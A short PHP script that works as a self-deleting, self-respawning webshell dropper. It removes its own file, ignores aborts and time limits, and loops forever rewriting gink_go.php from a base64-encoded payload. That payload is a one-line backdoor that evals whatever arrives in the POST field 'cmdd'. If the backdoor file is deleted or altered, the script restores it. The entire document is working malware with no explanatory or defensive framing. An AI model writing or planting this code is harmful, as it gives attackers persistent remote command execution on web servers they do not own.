<?php
@unlink($_SERVER['SCRIPT_FILENAME']);
error_reporting(0);
ignore_user_abort(true);
set_time_limit(0);
function uploadshell(){
	file_put_contents("gink_go.php",base64_decode("PD9waHAgQGV2YWwoJF9QT1NUWydjbWRkJ10pOyA/Pg=="));
	$check_md5=md5_file("gink_go.php");
	return $check_md5;
}
while(1){
	if(file_exists("gink_go.php")){
		if(is_dir("gink_go.php")){
			rename("gink_go.php",(string)time());
			$check_md5=uploadshell();
		}
		else{
			$check_md55 = md5_file("gink_go.php");
			if(isset($check_md5)){
				if($check_md5 === $check_md55){
					continue;
				}
			else{
				@unlink("gink_go.php");
				$check_md5=uploadshell();
			}
			}	
		else{
			@unlink("gink_go.php");
			$check_md5=uploadshell();
		}
	}
}
	else{
		$check_md5=uploadshell();
	}

}
?>
